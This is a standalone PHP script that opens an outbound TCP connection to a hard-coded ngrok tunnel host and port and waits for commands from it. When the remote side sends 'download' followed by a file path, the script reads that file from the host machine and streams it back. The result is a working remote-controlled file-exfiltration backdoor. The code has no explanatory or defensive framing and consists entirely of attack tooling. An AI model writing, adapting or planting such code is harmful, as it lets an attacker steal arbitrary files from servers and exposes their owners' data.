<?php
$host = "6.tcp.ngrok.io";
// $port = 12927;
$port = 10562 ;
$socket = socket_create(AF_INET,SOCK_STREAM,SOL_TCP) or die("could not create socket\n");
$result = socket_connect($socket,$host,$port) or die("could not connect to server\n");
if($result){
    echo "connected to socket server\n";
}
$terminate = "terminate";
$closed = false;
while(true){

$input = socket_read($socket,1024) or die("could not read server response\n");
if(preg_match("/^\s*download\s+(.+)\s*(2>&1)?$/", $input)){
    preg_match("/^\s*download\s+(.+)\s*(2>&1)?$/", $input,$match);
    $filename = $match[1];
    $fh = fopen($filename,"rb");
    $fileData = fread($fh,1024);
    while($fileData){
        // sendResponse($socket,$fileData);
        socket_write($socket,$fileData,1024) ;            
        $fileData = fread($fh,1024);
    }
    // fclose($fh);
    $hello = "completed";
    if(socket_write($socket,$hello,strlen($hello))){
        echo "completed\n";
    }
}
           
}
?>